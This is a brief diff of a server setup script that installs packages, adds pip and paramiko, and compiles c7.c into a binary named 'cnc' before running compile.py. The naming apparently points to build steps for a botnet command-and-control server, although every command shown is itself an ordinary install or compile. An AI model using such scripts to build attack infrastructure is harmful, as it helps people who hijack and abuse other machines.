@@ -3,10 +3,12 @@ yum install deltarpm
 yum install httpd
 yum install iptables
 
+curl -O https://bootstrap.pypa.io/pip/2.7/get-pip.py
+pip2 install paramiko
 
-yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+yum install python-paramiko nano screen gcc perl wget libzip unzip -y
 
-gcc c7.c -o cnc -pthread
+gcc c7.c -w -o cnc -pthread
 
 python compile.py
 
